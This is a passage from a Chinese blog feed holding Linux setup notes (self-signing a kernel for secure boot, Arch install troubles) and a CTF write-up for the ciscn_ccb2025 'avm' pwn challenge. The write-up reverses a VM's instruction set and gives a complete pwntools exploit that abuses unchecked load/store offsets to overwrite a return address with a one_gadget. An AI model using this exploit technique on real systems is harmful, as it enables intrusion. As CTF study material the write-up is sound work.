href="https://github.com/xuwd1/lenovo-legion-slim7i-gen7-knowledges/wiki/%E8%A7%A3%E5%86%B3%E6%97%A0%E5%A4%96%E6%94%BE%E5%A3%B0%E9%9F%B3%E7%9A%84%E9%97%AE%E9%A2%98">这篇</a>文章。</p><blockquote><p>另外还能将自己的id加在内核后面，好玩。</p></blockquote><p>然后选择的最新的6.8.1内核。虽然是官方发布的内核但是没有发行版的签名，secure boot过不了，windows玩瓦那个b反作弊又要求开secure boot很烦，所以又要自己去签名内核。直接问了copilot加上自己搜索，执行以下几条命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj &quot;/CN=ZJ Secure Boot Signing Key/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可能会要求输入密码，等下uefi启动会用</span></span><br><span class="line">sudo mokutil --import MOK.der</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里要先安装sbsign，apt就行 sudo apt install sbsigntool</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.der --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">报错了，问了copilot然后将证书改成.pem格式：</span></span><br><span class="line">openssl x509 -in MOK.der -inform DER -out MOK.pem -outform PEM</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新执行</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.pem --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br></pre></td></tr></table></figure><p>重启即可，这时候就可以打开secure boot了。从linux重启的时候会进入一个引导界面，选择enroll key然后输入密码即可。但是第一次启动gui界面直接花屏了，吓得我以为显卡驱动模块也要单独签名，结果再重启一次一切就正常了。这是一个没有任何关于密码学、证书、签名、非对称加密经验的人手动签名内核的经历。</p><h2 id="2024-6-2-Arch启动">2024.6.2 Arch启动</h2><p>deepinV20的glibc版本太低了很难受，先是重装了一个V23，但是效果不是很理想，不太喜欢V23的UI风格，而且流畅度还有缺陷。犹豫了一下加入Arch神教，好在现在已经有archinstall的脚本可以快速配置。不得不说KDE plasma就是漂亮——但是涉及显示问题就很多了。<br>外接屏幕不好用，显卡切换的问题，英伟达对wayland不支持…太史了。还是决定以后用这个系统就integrated模式算了，流畅度什么的也很高用着很舒服。还需要把安装的软件优化一下精简一下体积。毕竟都用arch了多少还是得洁癖一下。</p><p>彻底放弃英伟达，nouveau模块命名黑名单了没装，按照各种办法包括不从图形界面启动也调了但是没用，英伟达驱动开不了，应该是pacman的那个版本可能没法自动装载驱动，导致n卡默认驱动一直是nouveau但是我又禁用了它就一直没法输出。懒得搞了</p><p>2024.8不死心又搞了一次，mkinitcpio做内核镜像直接将nvidia挂载上，驱动是装上了显卡也能用（在xorg下）但是外接屏幕还是没用，运行一下nvidia-xconfig直接将图形化干没了，试了网上的解决方法都不行，最后直接删了xorg.conf然后配置sddm wayland启动 滚吧</p><h2 id="2025-2">2025.2</h2><p>最近课程设计比较轻松，重新搞这个arch，闲鱼花了20远程装了下，最后发现是nvidia的闭源驱动和内核版本强绑定，长时间没滚就寄了，装的时候还说我这依赖也烂。。。问题一堆但总算装上了，然而我自己折腾双显卡的时候，用了envycontrol，切换到集显一开机直接花屏了，livecd试着修了下也没办法，考虑到装的时候的那一堆问题，干脆推倒重来算了。</p><p>重装arch反而是最简单的，装好之后用btrfs文件系统回滚不要太爽，ext4吃屎去吧。重装之后直接pacman nvidia，有了前面踩坑的经验二周目速通了，配置内核参数似乎都不用就能开？</p><p>总之optimus manager也是搞上了，装好之后电源策略bbswitch一错直接回滚或者重装懒得bb。整理一个新的总集篇好吧</p><h2 id="2025-3">2025.3</h2><p>因为patch c++lib的时候刷到帖子直接copy libm.so到系统路径下做替换的想试试，结果直接烂了，命令用不了操作做不了，开机直接蓝屏。这时候直接插上启动盘把主系统挂载上改回来就行。</p><h2 id="shell脚本学习">shell脚本学习</h2><p>shell声明 <code>#! /bin/bash</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这篇文章可能都是什么也不懂的时候记录一些了解到的知识，kernel pwn也会放在linux这个类下，可能以后学了内核pwn会有不同的感受吧。&lt;/p&gt;
&lt;h2 id=&quot;2023-11-26-linux文件系统根目录下那些都是干什么的？&quot;&gt;2023.11.26 linux文件</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IDA-Better_printk推广</title>
    <link href="https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/"/>
    <id>https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/</id>
    <published>2025-02-20T14:22:10.000Z</published>
    <updated>2025-02-21T08:08:27.614Z</updated>
    
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_ccb2025初赛-avm重做wp</title>
    <link href="https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/"/>
    <id>https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/</id>
    <published>2025-02-20T14:19:56.000Z</published>
    <updated>2025-02-21T08:01:11.163Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><h2 id="逆向虚拟机结构">逆向虚拟机结构</h2><p>这道题目的虚拟机还算规整，从main函数开始看，从对虚拟机初始化的函数入手并结合代码执行的函数可以看出，整体的vm结构放在了bss，包括32个通用寄存器，rip，代码指针和代码大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">initvm</span><span class="params">(<span class="keyword">struct</span> vm *mem, __int64 code, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  mem-&gt;CS_code_start = code;</span><br><span class="line">  mem-&gt;code_size = size;</span><br><span class="line">  result = mem;</span><br><span class="line">  mem-&gt;RIP = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = mem;</span><br><span class="line">    mem-&gt;regs[i] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虚拟机结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> // <span class="title">sizeof</span>=</span><span class="number">0x118</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: .bss:vm/r</span></span><br><span class="line"><span class="number">00000000</span>     __int64 regs[<span class="number">32</span>];</span><br><span class="line"><span class="number">00000100</span>     __int64 RIP;</span><br><span class="line"><span class="number">00000108</span>     __int64 CS_code_start;</span><br><span class="line"><span class="number">00000110</span>     <span class="type">unsigned</span> __int64 code_size;</span><br><span class="line"><span class="number">00000118</span> &#125;;</span><br></pre></td></tr></table></figure><h2 id="逆向指令集">逆向指令集</h2><p>这里复现的时候也头晕的不行，我们先看执行函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">execute</span><span class="params">(<span class="keyword">struct</span> vm *vm)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> insn; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE s[<span class="number">264</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( vm-&gt;RIP &lt; vm-&gt;code_size )</span><br><span class="line">  &#123;</span><br><span class="line">    insn = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL)) &gt;&gt; <span class="number">28</span>;<span class="comment">// rip指针四字节对齐</span></span><br><span class="line">    <span class="keyword">if</span> ( insn &gt; <span class="number">0xA</span> || !insn )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Unsupported instruction&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> vm *, _BYTE *))funcs_1AAD[insn])(vm, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，虚拟机指令最终的执行是借助一个vtable实现的。逐一分析vtable里的函数就能还原指令的功能，包括add,sub等常见运算与两个关键的访存指令指令包含三个操作数和一个操作码。最高4位是操作数，限制为0-10，用于下标直接从vtable中索引操作。而其余三个操作数对于运算指令来说，分为最低5位，次5位和高字的低5位（16-20）。用5位数0-31来在32个通用寄存器中索引操作，第一操作数为5-9，第二操作数位16-20，第三操作数（结果寄存器）为0-4.</p><blockquote><p>ps: 这里绕了我半天，每次看着看着就不记得哪个减哪个了，也不确定自己封装的对不对…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">sub</span><span class="params">(<span class="keyword">struct</span> vm *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(_DWORD *)(a1-&gt;CS_code_start + (a1-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  a1-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;regs[v2 &amp; <span class="number">0x1F</span>] = a1-&gt;regs[(v2 &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] - a1-&gt;regs[HIWORD(v2) &amp; <span class="number">0x1F</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而两个访存指令则比较特别，对于load，其可以从一个指定地址加载8字节到一个通用寄存器。虚拟机运行指令时会在调用指令前的一个函数内分配一段空间并作为参数传入。这个指令也是三个操作数，不同的是会用一个寄存器做基地址，高字的低12位做偏移来针对a2做索引，然后结果放入结果寄存器。store则与其相反，参数规则一样，是将结果寄存器内容存入指定地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">load</span><span class="params">(<span class="keyword">struct</span> vm *vm, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+1Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cur_instruc; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  cur_instruc = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  vm-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)(<span class="type">unsigned</span> __int8)byte_4010;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + BYTE2(cur_instruc)) &lt; (<span class="type">unsigned</span> __int8)byte_4010 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = vm;</span><br><span class="line">    v3 = vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + (HIWORD(cur_instruc) &amp; <span class="number">0xFFF</span>);</span><br><span class="line">    vm-&gt;regs[cur_instruc &amp; <span class="number">0x1F</span>] = ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">7</span>] &lt;&lt; <span class="number">56</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">6</span>] &lt;&lt; <span class="number">48</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">5</span>] &lt;&lt; <span class="number">40</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">4</span>] &lt;&lt; <span class="number">32</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | *(<span class="type">unsigned</span> __int16 *)&amp;a2[v3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>漏洞分析</h1><p>显然，访存指令的权限太大了。这个指令里的偏移能索引0xfff，也就是说我们能够在一个相当大范围的栈上任意读写。构造ROP或者直接ret2og都是可以的。不过这道题的难点是，他没有泄露，我们需要自己去凑libc地址，所以从栈上想办法找一个“好”的地址就成为了本题的关键。但比较恶心的是，可能由于aslr的存在，栈内部的偏移许多都是不固定的，因此这道题让我掌握了一个很宝贵的经验，也就是<strong>合理使用search+distance指令组合拳</strong>。</p><blockquote><p>另外有一个简单的点，由于0xfff实在太大了，我们可以load和store我们输入的code内容，也就是说基本是直球的栈上任意地址读写。</p></blockquote><h2 id="pwndbg好用捏">pwndbg好用捏</h2><p>pwndbg为我们提供了轮椅为什么不用？调试过程中会以返回地址形式显示函数调用堆栈，我们可以直接找最近的libc内地址，直接<code>search -t pointer</code>，然后<code>distance $rsi</code>，就能看到需要多少的偏移。找一个不变的即可，比stack之后肉眼观察强太多了。</p><h2 id="onegadget">onegadget</h2><p>这里og选取不是很容易，改完返回地址程序退出后rbp是0x1导致很多条件简单的og用不了，这个是直接从网上的wp copy的，实战过程中可以一个个试一试，指定<code>-l 1</code>之后其实也没有太多。</p><h1>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p32</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># 4字节指令</span></span><br><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="comment"># 高四位是操作码，从0-10对应10个指令</span></span><br><span class="line"><span class="comment"># 低5位是一个寄存器</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 4 7 5 | 6 5 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数全部都是寄存器编号</span></span><br><span class="line"><span class="comment"># a op b -&gt; c</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> p32(((op &amp; <span class="number">0xF</span>)&lt;&lt;<span class="number">28</span>) + ((b &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>) + ((a &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>) + (c &amp; <span class="number">0x1f</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">1</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">2</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">3</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">4</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">5</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_and</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">6</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">7</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">8</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">base,offset,content</span>):</span><br><span class="line">    op = <span class="number">0x9</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    cont = content &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">base,offset,r</span>):</span><br><span class="line">    op = <span class="number">0xA</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    target = r &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指令本身提供任意地址读写</span></span><br><span class="line"><span class="comment"># 因此需要找合适地址做写入，code就在栈上，偷地址出来然后试着改</span></span><br><span class="line"><span class="comment"># 一般这种题的思路都是先试og，不行再试试system</span></span><br><span class="line"><span class="comment"># 首先，先检查泄露，这道题没有任何输出内容，要泄露需要自己调puts，会很麻烦</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这道题的核心是要想办法在寄存器凑出一个关键的写入地址</span></span><br><span class="line"><span class="comment"># 他妈的我的脑子就是绕不过来这个指令</span></span><br><span class="line"><span class="comment"># 哦，原来是在执行访存指令时会额外传入一个栈上的地址做偏移，我们相当于可以在栈上一个地址偏移0x100范围内操作</span></span><br><span class="line"><span class="comment"># 可以从栈上找好的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search -t dword 0xa1200001</span></span><br><span class="line"><span class="comment"># distance $rsi 0xxxxxxxxx</span></span><br><span class="line"><span class="comment"># x /20gx $rebase(0x40c0) 检验</span></span><br><span class="line"><span class="comment"># 可以将寄存器写入我们的内容，0x120开始是我们的内容</span></span><br><span class="line"><span class="comment"># og是便宜，至少用一次sub？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 思路：</span></span><br><span class="line"><span class="comment"># target写入code-&gt;读取到寄存器中备用</span></span><br><span class="line"><span class="comment"># 找一个libc地址-&gt;在我们的code里写入偏移-&gt;都读到寄存器里做sub出base-&gt;读入og-&gt;相加拿到og真实地址-&gt;将og写入target</span></span><br><span class="line"><span class="comment"># 好他妈的绕啊我操了 payload思路全有但是写着很费劲不知道怎么开始</span></span><br><span class="line"><span class="comment"># vm心魔？？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 想办法先算出libc真实的基地址存在一个寄存器里</span></span><br><span class="line"><span class="comment"># onegadget = 0x</span></span><br><span class="line"><span class="comment"># 读取目标写入内容（og的偏移放在3了）</span></span><br><span class="line"><span class="comment"># payload = load(0,0x120,1) + load(0,0x124,2) + add(1,2,3)</span></span><br><span class="line"><span class="comment"># 读取一个偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取一个libc地址</span></span><br><span class="line"><span class="comment"># off: 0x29d90</span></span><br><span class="line"><span class="comment"># 常识：2.35的libc_start_main在栈上存储值偏移为0x29d90</span></span><br><span class="line">one_gadget = <span class="number">0x50a47</span></span><br><span class="line">payload = load(<span class="number">0</span>,<span class="number">0xd38</span>,<span class="number">1</span>) <span class="comment">#哦我sb了读是读8字节</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x140</span>,<span class="number">9</span>) + sub(<span class="number">1</span>,<span class="number">9</span>,<span class="number">4</span>) <span class="comment"># 4是libc的基地址</span></span><br><span class="line"><span class="comment"># 草拟吗，这个地址在wsl kali里也一直跳</span></span><br><span class="line"><span class="comment"># 算og</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x138</span>,<span class="number">8</span>) + add(<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>) <span class="comment"># 5为og真实值</span></span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">payload += store(<span class="number">0</span>,<span class="number">0x118</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(one_gadget) + p64(<span class="number">0x29d90</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;opcode: &quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;h2 id=&quot;逆向虚拟机结构&quot;&gt;逆向虚拟机结构&lt;/h2&gt;
&lt;p&gt;这道题目的虚拟机还算规整，从main函数开始看，从对虚拟机初始化的函数入手并结合代码执行的函数可以看出，整体的vm结构放在了bss，包括32个通用寄存器，rip，代码指针和代码大小。&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="vm" scheme="https://zjw1nd.github.io/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>前端小实践之修复github列表渲染错误</title>
    <link href="https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/"/>
